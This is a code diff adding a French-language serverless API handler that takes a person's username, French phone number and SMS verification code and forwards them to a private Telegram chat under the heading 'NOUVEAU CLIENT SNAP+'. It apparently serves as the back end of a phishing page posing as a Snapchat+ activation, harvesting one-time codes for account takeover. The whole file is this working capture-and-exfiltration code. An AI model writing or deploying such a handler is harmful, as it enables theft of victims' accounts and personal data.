@@ -1,1 +1,59 @@
+export default async function handler(req, res) {
+  if (req.method !== 'POST') {
+    return res.status(405).json({ error: 'Method not allowed' });
+  }
 
+  try {
+    const { clientName, clientPhone, clientSmsCode, timestamp } = req.body;
+    
+    const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
+    const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
+
+    if (!clientName || !clientPhone || !clientSmsCode) {
+      return res.status(400).json({ error: 'Données manquantes' });
+    }
+
+    if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
+      console.error('❌ Variables d\'environnement manquantes');
+      return res.status(500).json({ error: 'Configuration serveur incomplète' });
+    }
+
+    const telegramMessage = `📝 **NOUVEAU CLIENT SNAP+**
+
+👤 **Nom d'utilisateur:** ${clientName}
+📱 **Numéro de téléphone:** +33${clientPhone}
+🔐 **Code SMS:** ${clientSmsCode}
+⏰ **Heure:** ${timestamp || new Date().toLocaleString('fr-FR')}
+
+✅ Activation Snap+ en cours...`;
+
+    const response = await fetch(
+      `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
+      {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          chat_id: TELEGRAM_CHAT_ID,
+          text: telegramMessage,
+          parse_mode: 'Markdown'
+        })
+      }
+    );
+
+    const telegramResponse = await response.json();
+
+    if (!response.ok) {
+      console.error('Erreur Telegram:', telegramResponse);
+      return res.status(500).json({ error: 'Erreur lors de l\'envoi à Telegram' });
+    }
+
+    res.status(200).json({ 
+      success: true, 
+      message: 'Notification envoyée avec succès!',
+      telegramMessageId: telegramResponse.result.message_id
+    });
+  } catch (error) {
+    console.error('Erreur serveur:', error.message);
+    res.status(500).json({ error: 'Erreur interne du serveur' });
+  }
+}
